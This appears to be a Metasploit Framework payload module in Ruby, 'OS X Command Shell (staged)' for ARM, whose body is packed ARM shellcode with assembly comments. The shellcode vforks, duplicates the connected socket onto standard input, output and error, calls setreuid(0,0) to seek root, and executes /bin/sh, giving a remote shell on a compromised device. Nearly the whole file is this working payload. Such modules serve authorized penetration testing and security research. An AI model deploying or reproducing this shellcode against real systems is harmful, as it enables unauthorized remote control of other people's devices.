##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X Command Shell',
      'Description'   => 'Spawn a command shell (staged)',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_ARMLE,
      'Session'       => Msf::Sessions::CommandShell,
      'Stage'         =>
        {
          'Payload' =>
            [
              # vfork
              0xe3a0c042, # mov r12, #0x42
              0xe0200000, # eor r0, r0, r0
              0xef000080, # swi 128
              0xe3500000, # cmp r0, #0x0
              0x0a000017, # beq _exit

              # setup dup2
              0xe3a05002, # mov r5, #0x2

              # dup2
              0xe3a0c05a, # mov r12, #0x5a
              0xe1a0000a, # mov r0, r10
              0xe1a01005, # mov r1, r5
              0xef000080, # swi 128
              0xe2455001, # sub r5, r5, #0x1
              0xe3550000, # cmp r5, #0x0
              0xaafffff8, # bge _dup2

              # setreuid
              0xe3a00000, # mov r0, #0x0
              0xe3a01000, # mov r1, #0x0
              0xe3a0c07e, # mov r12, #0x7e
              0xef000080, # swi 128

              # execve
              0xe0455005, # sub r5, r5, r5
              0xe1a0600d, # mov r6, sp
              0xe24dd020, # sub sp, sp, #0x20
              0xe28f0014, # add r0, pc, #0x14
              0xe4860000, # str r0, [r6], #0
              0xe5865004, # str r5, [r6, #4]
              0xe1a01006, # mov r1, r6
              0xe3a02000, # mov r2, #0x0
              0xe3a0c03b, # mov r12, #0x3b
              0xef000080, # swi 128

              # /bin/sh
              0x6e69622f,
              0x0068732f,

              # exit
              0xe3a0c001, # mov r12, #0x1
              0xef000080  # swi 128
            ].pack("V*")
        }
      ))
  end

end
